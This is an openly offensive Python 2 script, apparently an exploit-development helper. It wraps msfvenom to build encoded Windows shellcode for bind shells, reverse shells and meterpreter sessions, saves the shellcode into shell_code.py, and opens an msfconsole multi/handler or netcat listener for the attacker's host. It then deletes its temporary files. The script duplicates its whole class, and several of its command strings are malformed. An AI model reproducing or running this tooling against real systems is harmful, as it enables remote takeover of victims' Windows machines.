#!/usr/bin/env python2

import sys
import subprocess
import time
import fileinput
import shutil
import os

W = '\033[0m'     
R = '\033[31m'    
G = '\033[0;32m'  
O = '\33[37m'     
B = '\033[34m'    
P = '\033[35m'   
Y = '\033[1;33m' 

try:  
   if sys.argv[0] and '-c' in sys.argv[1] and  len(sys.argv[1])==2 \
   and'off' in sys.argv[2] and\
   len(sys.argv[2])==3 :
      W = ''     
      R = ''    
      G = ''  
      O = ''     
      B = ''    
      P = ''   
      Y = ''
   
   else: 
       W='\033[0m'     
       R='\033[31m'
       print R+'[*]\n'+W+R+'PLZ SET THE COLOR TO OFF -c off'+W+'\n'+R+'='*25+'\n'
       exit()
except IndexError:
          try:
            if sys.argv[1]:
               W='\033[0m'     
               R='\033[31m'
               print R+'[*]\n'+W+R+'PLZ SET THE COLOR TO OFF -c off'+W+'\n'+R+'='*25+'\n'
               exit()  
          except IndexError:
               pass

class Msf_Helper:
    
   def __init__(self):  

      self.shell_option()    
      self.Seclect__()
      self.S_auto()
      self.copy_shell()
      self.listiner()
   def shell_option(self):
       
      with open('.data','r')as data:
           data_list   =   list(data)                        
      self.bad_char    =   data_list[3].replace('\n','')
      self.host_ip     =   data_list[5].replace('\n','')      
      self.selcet1= "1"
      self.selcet2= "2"
      self.selcet3= "3"
      self.selcet4= "4"
      self.selcet5= "5"
      self.selcet6= "6"
      time.sleep(2)
      print O+"\n[+]"+W+B+" Select Paylaod "+W+'\n'+Y+'='*25+'\n'
      print R+"[*] "+W+Y+ "1-"+W+B+ " windows/shell/bind_tcp "+W
      time.sleep(0.30)
      print R+"[*] "+W+Y+ "2-"+W+B+ " windows/shell_reverse_tcp "+W
      time.sleep(0.30)
      print R+"[*] "+W+Y+ "3-"+W+B+ " windows/powershell_reverse_tcp "+W 
      time.sleep(0.30)       
      print R+"[*] "+W+Y+ "4-"+W+B+ " windows/meterpreter/reverse_tcp"+W
      time.sleep(0.30)
      print R+"[*] "+W+Y+ "5-"+W+B+ " windows/meterpreter_reverse_http"+W
      time.sleep(0.30)
      print R+"[*] "+W+Y+ "6-"+W+B+ " windows/meterpreter_reverse_https "+W
      time.sleep(0.30)
      print '\n'+O+'+'*40+W
   def Seclect__(self):
         try:
             self.select0= str(raw_input(O+"\n[$] "+W+O+"Select Payload Number : "+W)) 
             time.sleep(0.30)                 
             self.select_port = int(raw_input(O+"[$] "+W+O+"LPORT   =  "+W))
             if self.select_port =='' or len(str(self.select_port)) >=6 :
                 print Y+"\n\r\r!---___"+W+P+"defoult LPORT = 4444"+W+Y+"---___"+W 
                 self.select_port ='4444'  
         except Exception ,exc: 
                print Y+"\n\r\r!---___"+W+P+"Check LPORT integer Required or an Incorrect Port Range"+W+P+"%s" %exc+W+Y+"---___"+W 
                time.sleep(0.30)
                self.Seclect__()
   def S_auto(self):        
      if self.select0 == self.selcet1 and len(self.select0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/shell_bind_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(str(self.select_port))+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_char)+W +P+'"'+W                 
            run1 = 'msfvenom -p windows/shell_bind_tcp LHOST='+'{}'.format(self.host_ip )+'LPORT='+\
            '{}'.format(str(self.select_port))+' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+'> ./.rawshell ','2>/dev/null'
            print O+'\n[*] '+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run1,shell=True)   
            self.payload = 'windows/shell_bind_tcp' 
      elif self.select0 == self.selcet2 and len(self.select0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/shell_reverse_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(str(self.select_port))+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_char)+W +P+'"'+W                 
            run2 = 'msfvenom -p windows/shell_reverse_tcp LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(str(self.select_port))+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+' > ./.rawshell ','2>/dev/null'
            print O+'\n[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run2,shell=True) 
            self.payload = 'windows/shell_reverse_tcp'
      elif self.select0 == self.selcet3 and len(self.select0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/powershell_reverse_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(str(self.select_port))+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_char)+W +P+'"'+W     
            run3 = 'msfvenom -p windows/powershell_reverse_tcp LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(str(self.select_port))+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+'> ./.rawshell ','2>/dev/null'
            print O+'\n[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run3,shell=True)
            self.payload = 'windows/powershell_reverse_tcp'
      elif self.select0 == self.selcet4 and len(self.select0)==1:  
            print O+'[+] '+W+P+'msfvenom -p windows/meterpreter/reverse_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(str(self.select_port))+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_char)+W +P+'"'+W                
            run4 = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(str(self.select_port))+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+'> ./.rawshell ','2>/dev/null'
            print O+'\n[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run4,shell=True) 
            self.payload = 'windows/meterpreter/reverse_tcp'
      elif self.select0 == self.selcet5 and len(self.select0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/meterpreter_reverse_http LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(str(self.select_port))+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_char)+W +P+'"'+W     
            run5 = 'msfvenom -p windows/meterpreter_reverse_http" LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(str(self.select_port))+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+' > ./.rawshell ','2>/dev/null' 
            print O+'\n[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run5,shell=True) 
            self.payload = 'windows/meterpreter_reverse_http'
      elif self.select0 == self.selcet6 and len(self.select0)==1:  
            print O+'[+] '+W+P+'msfvenom -p windows/meterpreter_reverse_https LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(str(self.select_port))+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_char)+W +P+'"'+W                
            run6 = 'msfvenom -p windows/meterpreter_reverse_https LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(str(self.select_port))+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+' > ./.rawshell,','2>/dev/null'
            print O+'\n[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run6,shell=True) 
            self.payload = 'windows/meterpreter_reverse_https'
      else:
            print Y+"\n\r\r!---___"+W+P+"Seclet from the Optins!"+W+Y+"---___"+W
            self.shell_option()
            self.Seclect__()
            self.S_auto()
            self.listiner()
   def copy_shell(self):
         
       with open ('./.rawshell','r') as shellcode:
            shell_code = shellcode.read()
       with open ('./.rawshell','w')as shellcode:
            shel_code = shellcode.write('# pls add your shellcode '+'\n'+\
            'shell_code =('+shell_code.replace('unsigned char buf[] =','').replace(';',')'))

       with open('./.rawshell','r')as readcode :
            readall = readcode.read()
       with open('./shell_code.py','w') as allcode:
            shellall = allcode.write(readall)
       os.remove('./.rawshell')

   def listiner(self):
       print O+"\n[+]"+W+B+" set Listener "+W+'\n'+Y+'='*25+'\n'     
       self.selcet1= "1"
       self.selcet2= "2"
       print R+"[*] "+W+Y+ "1- "+W+B+ "msfconsolel"+W
       print R+"[*] "+W+Y+ "2- "+W+B+ "netcat"+W 
       select01= str(raw_input(O+"\n[$] "+W+O+"Select Mode Number : "+W))
       if select01 == self.selcet1 and len(select01)==1: 
          with open ('./.resource','w') as resource : 
               file_resource = resource.write('use exploit/multi/handler'+'\n'+'set payload  '+self.payload+\
               '\n'+'set  LHOST '+self.host_ip+'\n'+'set  LPORT '+str(self.select_port)+'\n'+'clear' +'\n'+'run')
          command_proc = 'gnome-terminal  -e '+'" msfconsole -q -r .resource "'                       
          call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)   
          os.remove('.data')
          os.remove('.resource')       
       elif select01 == self.selcet2 and len(select01)==1:  
             command ='"'+'nc -nvlp'+str(self.select_port)+'"'
             command_proc = 'gnome-terminal  -e '+ command
             call_termminal = subprocess.call(command_proc,shell=True ,stderr=subprocess.PIPE)
             os.remove('.data')
             os.remove('.resource')
       else:
              print Y+"\n\r\r!---___"+W+P+"Seclet from the Optins!"+W+Y+"---___"+W
              self.listiner()
if __name__=="__main__":
   Msf_Helper()

class Msf_Char_NO:
    
   def __init__(self):  

      self.shell_option()      
      self.Seclect__()
      self.S_auto()
      self.copy_shell()
      self.listiner()

   def shell_option(self):
       
      with open('.data','r')as data:
           data_list   =   list(data)                        
      self.bad_char    =   data_list[0].replace('\n','')
      self.host_ip     =   data_list[1].replace('\n','')      
      self.selcet1= "1"
      self.selcet2= "2"
      self.selcet3= "3"
      self.selcet4= "4"
      self.selcet5= "5"
      self.selcet6= "6"
      time.sleep(2)
      print O+"\n[+]"+W+B+" Select Paylaod "+W+'\n'+Y+'='*25+'\n'
      print R+"[*] "+W+Y+ "1-"+W+B+ " windows/shell/bind_tcp "+W
      time.sleep(0.30)
      print R+"[*] "+W+Y+ "2-"+W+B+ " windows/shell_reverse_tcp "+W
      time.sleep(0.30)
      print R+"[*] "+W+Y+ "3-"+W+B+ " windows/powershell_reverse_tcp "+W 
      time.sleep(0.30)       
      print R+"[*] "+W+Y+ "4-"+W+B+ " windows/meterpreter/reverse_tcp"+W
      time.sleep(0.30)
      print R+"[*] "+W+Y+ "5-"+W+B+ " windows/meterpreter_reverse_http"+W
      time.sleep(0.30)
      print R+"[*] "+W+Y+ "6-"+W+B+ " windows/meterpreter_reverse_https "+W
      time.sleep(0.30)
      print '\n'+O+'+'*40+W
   def Seclect__(self):
         try:
             self.select0= str(raw_input(O+"\n[$] "+W+O+"Select Payload Number : "+W)) 
             time.sleep(0.30)                 
             self.select_port = int(raw_input(O+"[$] "+W+O+"LPORT   =  "+W))
             if self.select_port =='' or len(str(self.select_port)) >=6 :
                 print Y+"\n\r\r!---___"+W+P+"defoult LPORT = 4444"+W+Y+"---___"+W 
                 self.select_port ='4444'  
         except Exception ,exc: 
                print Y+"\n\r\r!---___"+W+P+"Check LPORT integer Required or an Incorrect Port Range "+W+P+"%s" %exc+W+Y+"---___"+W 
                time.sleep(0.30)
                self.Seclect__()
   def S_auto(self):        
      if self.select0 == self.selcet1 and len(self.select0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/shell_bind_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(str(self.select_port))+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_char)+W +P+'"'+W                 
            run1 = 'msfvenom -p windows/shell_bind_tcp LHOST='+'{}'.format(self.host_ip )+'LPORT='+\
            '{}'.format(str(self.select_port))+' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+'> ./.rawshell ','2>/dev/null'
            print O+'\n[*] '+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run1,shell=True)   
            self.payload = 'windows/shell_bind_tcp' 
      elif self.select0 == self.selcet2 and len(self.select0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/shell_reverse_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(str(self.select_port))+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_char)+W +P+'"'+W                 
            run2 = 'msfvenom -p windows/shell_reverse_tcp LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(str(self.select_port))+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+' > ./.rawshell ','2>/dev/null'
            print O+'\n[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run2,shell=True) 
            self.payload = 'windows/shell_reverse_tcp'
      elif self.select0 == self.selcet3 and len(self.select0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/powershell_reverse_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(str(self.select_port))+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_char)+W +P+'"'+W     
            run3 = 'msfvenom -p windows/powershell_reverse_tcp LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(str(self.select_port))+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+'> ./.rawshell ','2>/dev/null'
            print O+'\n[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run3,shell=True)
            self.payload = 'windows/powershell_reverse_tcp'
      elif self.select0 == self.selcet4 and len(self.select0)==1:  
            print O+'[+] '+W+P+'msfvenom -p windows/meterpreter/reverse_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(str(self.select_port))+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_char)+W +P+'"'+W                
            run4 = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(str(self.select_port))+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+'> ./.rawshell ','2>/dev/null'
            print O+'\n[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run4,shell=True) 
            self.payload = 'windows/meterpreter/reverse_tcp'
      elif self.select0 == self.selcet5 and len(self.select0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/meterpreter_reverse_http LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(str(self.select_port))+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_char)+W +P+'"'+W     
            run5 = 'msfvenom -p windows/meterpreter_reverse_http" LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(str(self.select_port))+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+' > ./.rawshell ','2>/dev/null' 
            print O+'\n[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run5,shell=True) 
            self.payload = 'windows/meterpreter_reverse_http'
      elif self.select0 == self.selcet6 and len(self.select0)==1:  
            print O+'[+] '+W+P+'msfvenom -p windows/meterpreter_reverse_https LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(str(self.select_port))+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_char)+W +P+'"'+W                
            run6 = 'msfvenom -p windows/meterpreter_reverse_https LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(str(self.select_port))+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+' > ./.rawshell,','2>/dev/null'
            print O+'\n[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run6,shell=True) 
            self.payload = 'windows/meterpreter_reverse_https'
      else:
            print Y+"\n\r\r!---___"+W+P+"Seclet from the Optins!"+W+Y+"---___"+W
            self.shell_option()
            self.Seclect__()
            self.S_auto()
            self.listiner()
   def copy_shell(self):
         
       with open ('./.rawshell','r') as shellcode:
            shell_code = shellcode.read()
       with open ('./.rawshell','w')as shellcode:
            shel_code = shellcode.write('# pls add your shellcode '+'\n'+\
            'shell_code =('+shell_code.replace('unsigned char buf[] =','').replace(';',')'))

       with open('./.rawshell','r')as readcode :
            readall = readcode.read()
       with open('./shell_code.py','w') as allcode:
            shellall = allcode.write(readall)
       os.remove('./.rawshell')

   def listiner(self):
       print O+"\n[+]"+W+B+" set Listener  "+W+'\n'+Y+'='*25+'\n'     
       self.selcet1= "1"
       self.selcet2= "2"
       print R+"[*] "+W+Y+ "1- "+W+B+ "msfconsolel"+W
       print R+"[*] "+W+Y+ "2- "+W+B+ "netcat"+W 
       select01= str(raw_input(O+"\n[$] "+W+O+"Select Mode Number : "+W))
       if select01 == self.selcet1 and len(select01)==1: 
          with open ('./.resource','w') as resource : 
               file_resource = resource.write('use exploit/multi/handler'+'\n'+'set payload  '+self.payload+\
               '\n'+'set  LHOST '+self.host_ip+'\n'+'set  LPORT '+str(self.select_port)+'\n'+'clear' +'\n'+'run')
          command_proc = 'gnome-terminal  -e '+'" msfconsole -q -r .resource "'                       
          call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)          
       elif select01 == self.selcet2 and len(select01)==1:  
             command ='"'+'nc -nvlp'+str(self.select_port)+'"'
             command_proc = 'gnome-terminal  -e '+ command
             call_termminal = subprocess.call(command_proc,shell=True ,stderr=subprocess.PIPE)
             os.remove('.data')
             os.remove('.resource')
       else:
              print Y+"\n\r\r!---___"+W+P+"Seclet from the Optins!"+W+Y+"---___"+W
              self.listiner()
if __name__=="__main__":
   Msf_Char_NO()


 

